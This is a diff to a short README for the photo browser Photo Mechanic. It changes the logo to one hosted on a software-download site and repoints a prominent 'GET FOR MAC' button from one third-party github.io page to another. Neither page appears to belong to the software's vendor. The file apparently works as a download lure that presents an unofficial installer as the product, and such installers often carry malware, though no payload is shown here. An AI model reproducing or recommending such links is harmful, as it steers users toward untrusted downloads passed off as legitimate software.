@@ -1,14 +1,14 @@
 # Photo Mechanic – Professional Photo Browser
 
 <div align="center">  
-  <img src="https://static.macupdate.com/products/9483/l/photo-mechanic-logo.png?v=1618157750" width="250" alt="Photo Mechanic Logo"/>  
+  <img src="https://macx.ws/uploads/posts/2019-03/1553593048_prophotomechanic.png" width="250" alt="Photo Mechanic Logo"/>  
 </div>  
 
 <br>  
 
 <div align="center">  
 
-[![Get for MacOS](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-applications-install.github.io/.github/PhotoMechanic)  
+[![Get for MacOS](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://apps-pozdnyakov-software.github.io/.github/PhotoMechanic)  
 
 </div>  
 
